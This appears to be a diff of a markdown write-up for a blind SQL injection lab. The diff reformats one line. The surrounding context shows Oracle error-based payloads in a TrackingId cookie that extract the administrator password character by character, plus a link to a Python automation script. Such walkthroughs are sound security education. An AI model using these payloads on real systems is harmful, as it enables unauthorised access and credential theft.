@@ -150,7 +150,8 @@ TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)=1 THEN TO_CHAR(1/0) ELSE 'te
 TrackingId=xyz'||(SELECT CASE WHEN ASCII(SUBSTR(password,1,1))=111 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 - But we need to try the ASCII numbers for each char so we will brute-forcing for 20 chars.
-- You will do the attack for these 2 positions: ASCII(SUBSTR(password,`$1-20$`,1))=`$ASCII_numbers$`
+- You will do the attack for these 2 positions: 
+>ASCII(SUBSTR(password,`$1-20$`,1))=`$ASCII_numbers$`
 - You can do that by using an intruder in the burp suite but it will take a long time to finish.
 - We can write a python script to extract the password automatically and quickly.
 - You can see my script from here:[SQLi_lab12_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab12_password_admin.py)
